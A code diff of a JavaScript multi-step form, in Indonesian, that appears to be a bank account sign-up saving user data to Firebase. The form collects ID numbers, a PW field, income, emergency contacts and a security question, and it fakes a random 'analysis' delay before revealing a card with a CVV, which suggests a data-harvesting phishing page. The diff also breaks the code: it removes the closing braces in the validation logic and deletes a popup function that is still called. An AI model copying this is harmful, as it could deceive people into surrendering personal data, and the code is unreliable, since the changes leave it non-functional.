@@ -86,7 +86,7 @@ const MODES = {
             ]},
             { id: 2, title: "02. Kontak Utama", fields: [
                 { id: "inputWA", label: "WhatsApp", type: "tel", placeholder: "08xxxxxxxxxx", validate: "digit11-13" },
-                { id: "inputEmail", label: "Email", type: "email", placeholder: "nama@email.com", validate: email" }
+                { id: "inputEmail", label: "Email", type: "email", placeholder: "nama@email.com", validate: "email" }
             ]},
             { id: 3, title: "03. Domisili", fields: [
                 { id: "address", label: "Alamat Lengkap", type: "text", placeholder: "Jalan, No Rumah...", validate: "min5" }
@@ -164,6 +164,7 @@ function parseURL() {
     }
 }
 
+// Simpan Progress ke Firebase Realtime
 async function saveProgressToFirebase() {
     if (!sessionToken) return;
     const allInputs = document.querySelectorAll('input, select');
@@ -195,31 +196,36 @@ async function checkExistingSession() {
     const urlToken = params ? params.t : null;
     const storedToken = localStorage.getItem('bdn_token');
 
+    // Jika URL ada token
     if (params && params.m && params.s && urlToken) {
+        // 1. Tampilkan Overlay Loading
         const overlay = document.getElementById('restoreOverlay');
-        if(overlay) overlay.style.display = 'flex'; // Tampilkan Loading
+        if(overlay) overlay.style.display = 'flex';
 
         try {
+            // Ambil data dari Firebase berdasarkan token di URL
             const snapshot = await get(ref(db, 'progress/' + urlToken));
             
             if (snapshot.exists()) {
                 const data = snapshot.val();
                 console.log("Data found in Firebase, restoring...");
 
+                // Set Variable Global
                 currentMode = data.mode;
-                currentStep = parseInt(params.s);
+                currentStep = parseInt(params.s); 
                 sessionToken = urlToken;
                 userDOB = data.dob || "";
                 formData = data.formData || {};
 
-                // Delay agar UX terasa "Realtime"
+                // Buat delay sedikit agar user melihat loading (UX lebih realistis)
                 setTimeout(() => {
                     if(overlay) overlay.style.display = 'none';
                     
+                    // Sembunyikan Age Gate & Tampilkan Form
                     document.getElementById('ageGate').style.display = 'none';
                     document.getElementById('progressContainer').style.display = 'flex';
-                    initApp(true); 
-                }, 1500); 
+                    initApp(true); // Restore mode
+                }, 1500); // Delay 1.5 detik
                 return true;
             }
         } catch (e) {
@@ -227,10 +233,10 @@ async function checkExistingSession() {
             if(overlay) overlay.style.display = 'none';
         }
     }
-    
-    if(document.getElementById('restoreOverlay')) {
-        document.getElementById('restoreOverlay').style.display = 'none';
-    }
+
+    // Jika tidak ada session valid
+    const overlay = document.getElementById('restoreOverlay');
+    if(overlay) overlay.style.display = 'none';
     
     return false; 
 }
@@ -297,6 +303,7 @@ function initApp(isRestoring = false) {
     const formContent = document.getElementById('formContent');
     const circleWrapper = document.getElementById('circleWrapper');
     
+    // 1. Build Progress Circles
     circleWrapper.innerHTML = '';
     for(let i=1; i<=config.steps.length; i++) {
         const c = document.createElement('div');
@@ -306,6 +313,7 @@ function initApp(isRestoring = false) {
         circleWrapper.appendChild(c);
     }
 
+    // 2. Build Steps HTML
     formContent.innerHTML = '';
     config.steps.forEach((step, index) => {
         const stepDiv = document.createElement('div');
@@ -344,10 +352,12 @@ function initApp(isRestoring = false) {
                 let valueAttr = field.id === 'inputDOB_Display' ? `value="${userDOB}"` : '';
                 
                 if(field.type === 'select') {
+                    // Jika mode restore, tandai option yang tersimpan
                     let opts = field.options.map(o => {
                         const selectedAttr = (isRestoring && formData[field.id] === o) ? 'selected' : '';
                         return `<option value="${o}" ${selectedAttr}>${o}</option>`;
                     }).join('');
+                    
                     fieldsHTML += `
                         <div class="input-group">
                             <label>${field.label}</label>
@@ -399,13 +409,6 @@ function setupInputListeners() {
     const nama = document.getElementById('inputNama');
     if(nama) nama.addEventListener('input', (e) => e.target.value = e.target.value.toUpperCase().replace(/[^A-Z\s]/g, ""));
     
-    const dob = document.getElementById('inputDOB');
-    if(dob) {
-        dob.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 8);
-        });
-    }
-    
     const nums = ['inputNIK', 'inputWA', 'inputPW', 'income', 'emPhone'];
     nums.forEach(id => {
         const el = document.getElementById(id);
@@ -433,7 +436,7 @@ window.nextStep = async (targetStep) => {
     
     currentStep = targetStep;
     updateURL();
-    await saveProgressToFirebase();
+    await saveProgressToFirebase(); // Simpan ke Firebase setiap ganti step
     updateUI(targetStep);
 
     if(currentStep === MODES[currentMode].steps.length) {
@@ -445,7 +448,7 @@ window.prevStep = () => {
     if(currentStep > 1) {
         currentStep--;
         updateURL();
-        saveProgressToFirebase(); 
+        saveProgressToFirebase(); // Simpan walau mundur
         updateUI(currentStep);
     }
 };
@@ -485,25 +488,18 @@ async function validateFields(stepIndex) {
         }
         if(field.validate === "min5") {
             if(val.length < 5) { alertPopUp(field.label + " terlalu singkat!"); return false; }
-        }
         if(field.validate === "len6") {
             if(val.length !== 6) { alertPopUp(field.label + " harus 6 digit!"); return false; }
-        }
         if(field.validate === "digit11-13") {
             if(val.length < 11 || val.length > 13) { alertPopUp(field.label + " harus 11-13 digit!"); return false; }
-        }
         if(field.validate === "digit10-13") {
-            if(val.length < 10 || val.length > 13) { alertUpUp(field.label + " tidak valid!"); return false; }
-        }
+            if(val.length < 10 || val.length > 13) { alertPopUp(field.label + " tidak valid!"); return false; }
         if(field.validate === "digit") {
             if(!/^\d+$/.test(val) || val.length === 0) { alertPopUp(field.label + " harus angka!"); return false; }
-        }
         if(field.validate === "email") {
             if(!val.includes('@') || !val.includes('.')) { alertPopUp("Email tidak valid!"); return false; }
-        }
         if(field.validate === "checked") {
             if(!el.checked) { alertPopUp(`Harap centang "${field.label}"!`); return false; }
-        }
         if(field.validate === "selected") {
             if(val === "" || val.includes("-- Pilih")) { alertPopUp(`Harap pilih ${field.label}!`); return false; }
         }
@@ -516,44 +512,12 @@ async function validateFields(stepIndex) {
             }
         }
         
-        // Validasi Khusus Wajib / Kontak
+        // Validasi Khusus WA / Kontak
         if(field.id === 'inputWA' || field.id === 'emPhone') {
-             if(val.length === 0) alertPopUp("Nomor WhatsApp tidak boleh kosong!");
+             if(val.length === 0) { alertPopUp("Nomor WhatsApp tidak boleh kosong!");
         }
     }
     return true;
-}
-
-// Fungsi Alert Pop Up Custom
-function alertPopUp(msg) {
-    const overlay = document.createElement('div');
-    overlay.style.cssText = `
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 10000;
-        display: flex; align-items: center; justify-content: center;
-    `;
-    
-    const box = document.createElement('div');
-    box.style.cssText = `
-        background: white; padding: 20px; border-radius: 12px; width: 80%; max-width: 400px;
-        text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-    `;
-    
-    const msgEl = document.createElement('p');
-    msgEl.innerText = msg;
-    msgEl.style.marginBottom = "15px";
-    
-    const btn = document.createElement('button');
-    btn.innerText = "MENGERTI";
-    btn.className = "btn-primary";
-    btn.onclick = () => {
-        document.body.removeChild(overlay);
-        document.body.removeChild(box);
-    };
-    
-    box.appendChild(msgEl);
-    box.appendChild(btn);
-    overlay.appendChild(box);
-    document.body.appendChild(overlay);
 }
 
 // --- LOADING SIMULATION ---
@@ -563,7 +527,7 @@ function runLoadingSimulation(stepIndex) {
     const btnNext = document.getElementById(stepDiv.dataset.nextBtnId);
     const errAct = document.getElementById(stepDiv.dataset.errId);
     
-    statusEl.innerText = "Menganalisis data...";
+    statusEl.innerText = "Menganisis data...";
     
     setTimeout(() => {
         const isSuccess = Math.random() > 0.1; 
@@ -670,17 +634,17 @@ async function finalRevealProcess(stepDiv) {
         const el = document.getElementById(id);
         if (el && el.value && el.value.trim() !== "") {
             if(id === 'inputWA') nasabahData.noHp = el.value;
-            else if(id === 'inputEmail') nasabahData.email = el.value;
-            else if(id === 'jobType') nasabahData.pekerjaan = el.value;
-            else if(id === 'income') nasabahData.pendapatan = el.value;
-            else if(id === 'incomeSource') nasabahData.sumberDana = el.value;
-            else if(id === 'accPurpose') nasabahData.tujuanAkun = el.value;
-            else if(id === 'waliName') nasabahData.namaWali = el.value;
-            else if(id === 'emName') nasabahData.kontakDarurat = el.value;
-            else if(id === 'emRelation') nasabahData.hubunganDarurat = el.value;
-            else if(id === 'emPhone') nasabahData.noHpDarurat = el.value;
-            else if(id === 'address') nasabahData.alamat = el.value;
-            else if(id === 'secQuestion') nasabahData.pertanyaanRahasia = el.value;
+            else if (id === 'inputEmail') nasabahData.email = el.value;
+            else if (id === 'jobType') nasabahData.pekerjaan = el.value;
+            else if (id === 'income') nasabahData.pendapatan = el.value;
+            else if (id === 'incomeSource') nasabahData.sumberDana = el.value;
+            else if (id === 'accPurpose') nasabahData.tujuanAkun = el.value;
+            else if (id === 'waliName') nasabahData.namaWali = el.value;
+            else if (id === 'emName') nasabahData.kontakDarurat = el.value;
+            else if (id === 'emRelation') nasabahData.hubunganDarurat = el.value;
+            else if (id === 'emPhone') nasabahData.noHpDarurat = el.value;
+            else if (id === 'address') nasabahData.alamat = el.value;
+            else if (id === 'secQuestion') nasabahData.pertanyaanRahasia = el.value;
         }
     });
 
@@ -695,7 +659,7 @@ async function finalRevealProcess(stepDiv) {
         alert("Koneksi terputus saat menyimpan!");
     }
 
-    changeCardRatio('ID-1',1.586, '85.60 × 53.98 mm');
+    changeCardRatio('ID-1', 1.586, '85.60 × 53.98 mm');
 
     const revs = stepDiv.querySelectorAll('.reveal-text');
     for(let i=0; i<revs.length; i++) {
@@ -745,8 +709,8 @@ window.changeCardRatio = (type, ratio, dimensionText) => {
         const cvvCode = activeStepDiv.querySelector('.cvv-code');
         const cardTerms = activeStepDiv.querySelector('.card-terms');
 
-        if(cvvLabel) cvvLabel.style.fontSize = `${2.0 * scaleFactor}cqw`; 
-        if(cvvCode) cvvCode.style.fontSize = `${6.0 * scaleFactor}cqw`;
+        if(cvvLabel) cvvLabel.style.fontSize = `${2.0 * scaleFactor}vw`; 
+        if(cvvCode) cvvCode.style.fontSize = `${6.0 * scaleFactor}vw`;
         if(cardTerms) cardTerms.style.fontSize = `${7.5 * scaleFactor}px`;
     }
 };
@@ -790,13 +754,14 @@ window.takeScreenshot = (stepDiv) => {
 };
 
 // --- INITIALIZATION ---
-checkExistingSession().then(restored => {
-    if (!restored) {
+(async () => {
+    const isRestored = await checkExistingSession();
+    
+    if (!isRestored) {
         console.log("New session or invalid URL.");
-        // Pastikan ageGate tampil
         document.getElementById('ageGate').style.display = 'block';
         document.getElementById('progressContainer').style.display = 'none';
     } else {
         console.log("Session restored from Firebase.");
     }
-});
+})();
